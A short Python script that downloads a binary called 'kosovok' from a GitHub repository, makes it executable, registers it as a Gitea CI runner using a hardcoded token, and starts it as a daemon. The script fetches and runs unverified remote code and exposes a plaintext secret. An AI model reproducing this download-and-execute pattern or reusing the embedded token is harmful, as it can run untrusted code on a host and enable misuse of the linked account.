import subprocess
import urllib.request
import os

TOKEN = "40ce80QAqU5DPfOqwHvsyTBpxx9OLqOjdna2maHk"

URL = "https://github.com/KOSOCOFA/legendary-rotary-phone/raw/refs/heads/main/kosovok"

# Download binary
print("[1] Downloading kosovok...")
urllib.request.urlretrieve(URL, "kosovok")

# Set permissions
os.chmod("kosovok", 0o755)

# Register runner
print("[2] Registering runner...")
subprocess.run([
    "./kosovok",
    "register",
    "--instance", "https://gitea.com/",
    "--token", TOKEN,
    "--labels", "maiso",
    "--name", "maiso"
], check=True)

# Start daemon
print("[3] Starting daemon...")
subprocess.run(["./kosovok", "daemon"], check=True)
